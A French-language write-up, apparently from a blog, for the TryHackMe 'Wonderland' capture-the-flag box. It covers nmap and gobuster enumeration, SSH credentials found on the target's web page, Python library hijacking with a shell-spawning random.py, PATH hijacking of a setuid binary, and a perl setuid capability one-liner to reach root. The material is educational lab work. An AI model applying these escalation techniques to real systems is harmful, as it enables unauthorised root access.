---
title: Wonderlands
weight: 1
---

# Wonderlands
<center>
<img src="../img/wonderlands_illu.png" width="300pct" >
</center>
Cette box suit le thème d'Alice au pays des merveilles. Comme d'habitude sur TryHackMe, il nous est fournit une adresse IP que nous allons commencer par scanner.

## Première approche avec Nmap

Le scan nous montre que seuls 2 ports sont ouverts, donc nous aurons à priori un premier accès via un site web puis certainement un accès via SSH. 

```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2025-09-24 20:05 CEST
Nmap scan report for 10.10.186.97
Host is up (0.066s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.20 seconds
```

## Énumération des chemins 

Le site web est une page simple qui ne nous fournit pas de lien ni de formulaire. Nous allons donc lancer une énumération pour chercher d'autres entrées.


```bash
./gobuster dir -u http://10.10.186.97/ -w ../Wordlists/DirBuster-2007_directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.186.97/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                ../Wordlists/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2025/09/24 20:20:32 Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 0] [--> img/]
/r                    (Status: 301) [Size: 0] [--> r/]
/poem                 (Status: 301) [Size: 0] [--> poem/]
```

Nous avons pour commencer plusieurs dossiers : 
- **/img** contient les images 
- **/poem** ne répond pas
- **/r** contient une autre page web, sans lien, mais avec un extrait d'Alice au pays des merveilles. Nous allons lancer un autre scan en partant de ce dossier.

```bash
./gobuster dir -u http://10.10.186.97/r/ -w ../Wordlists/DirBuster-2007_directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.186.97/r/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                ../Wordlists/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2025/09/24 20:30:01 Starting gobuster in directory enumeration mode
===============================================================
/a                    (Status: 301) [Size: 0] [--> a/]
```

On trouve un autre dossier '''/a''', le début de rabbit. Nous essayons donc le chemin /r/a/b/b/i/t et on tombe sur une page web qui nous fournit un identifiant et un mot de passe à utiliser en SSH.

![image.png](../img/wonderlands_burp.png)

**alice:HowDothTheLittleCrocodileImproveHisShiningTail**

## Premier accès SSH

### Premier drapeau 

On observe un fichier root.txt dans le dossier de alice. Ce fichier ne devrait pas être là. Après avoir honteusement demandé un indice à TryHackMe (il faut être honnête), TryHackMe nous dit "Everything is upside down". 

C'est logique : si root.txt est dans alice, alors user.txt est dans root.. et on trouve le drapeau /root/user.txt.

### Enumeration des droits

Revenons à notre box : l'énumération des droits sudo nous montre qu'il est possible de lancer un script python avec l'utilisateur rabbit : 

```bash
alice@wonderland:~$ sudo -l
[sudo] password for alice:
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

## Library Hijacking

En observant le script, on s'aperçoit que celui-ci importe random.py, on va donc créer dans le dossier courant une fausse librairie random.py pour exécuter du code arbitrairement.

On implante donc random.py dans le dossier d’alice : 

```python
# random.py

import os; os.system("/bin/sh")
```

Et on exécute le script avec l'utilisateur rabbit : 

```bash
sudo -u rabbit python3.6 /home/alice/walrus_and_the_carpenter.py

```


En executant on a un shell avec rabbit.

## Corruption du Path

L'utilisateur rabbit ne nous permet pas de lire le fichier root, mais en regardant dans le dossier de rabbit on trouve un executable.

```bash
rabbit@wonderland:/home/rabbit$ ./teaParty
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Wed, 25 Sep 2025 21:07:36 +0000
Ask very nicely, and I will give you some tea while you wait for him
please
Segmentation fault (core dumped)
```

on observe deux choses : 
- teaParty a un UID, ce qui veut dire qu'il s'exécute certainement avec un autre utilisateur.
- la chaîne "Wed, 25 Sep 2025 21:07:36 +0000" ressemble beaucoup à la sortie de la commande date. 

On va donc essayer de corrompre le path pour modifier l'exécution de date par /usr/bin/id.

```bash
$ head -1 /tmp/date > /tmp/date
$ echo "/usr/bin/id" >> /tmp/date
$ PATH=/tmp
$ ./teaParty
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by uid=1003(hatter) gid=1002(rabbit) groups=1002(rabbit)
Ask very nicely, and I will give you some tea while you wait for him
```

On a bien une modification de date par id : on change ```/usr/bin/id``` dans ```/tmp/date``` par ```/bin/bash``` et on obtient un shell avec hatter.


## getcap hatter

hatter a un fichier password.txt contenant son mot de passe, on utilise ce mot de passe pour créer une session propre.hatter n'a pas de droit sudo, et on ne trouve pas de binaire avec des suid intéressant. On liste les capabilities : 

```bash
hatter@wonderland:~$ getcap -r / 2>/dev/null
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
```

On observe également que perl appartient au groupe hatter : 

```bash
alice@wonderland:~$ ls -l /usr/bin | grep hatter
-rwxr-xr-- 2 root   hatter   2097720 Nov 19  2018 perl
-rwxr-xr-- 2 root   hatter   2097720 Nov 19  2018 perl5.26.1

```

On peut alors faire une escalade de privilège et trouver le dernier drapeau :  

```bash
hatter@wonderland:~$ /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
# id
uid=0(root) gid=1003(hatter) groups=1003(hatter)
# cat /home/alice/root.txt
thm{XXXXXXX, XXXXXXX, XXXXXX XXX! XXX X XXXXX XXXX XXXXXX XX}
```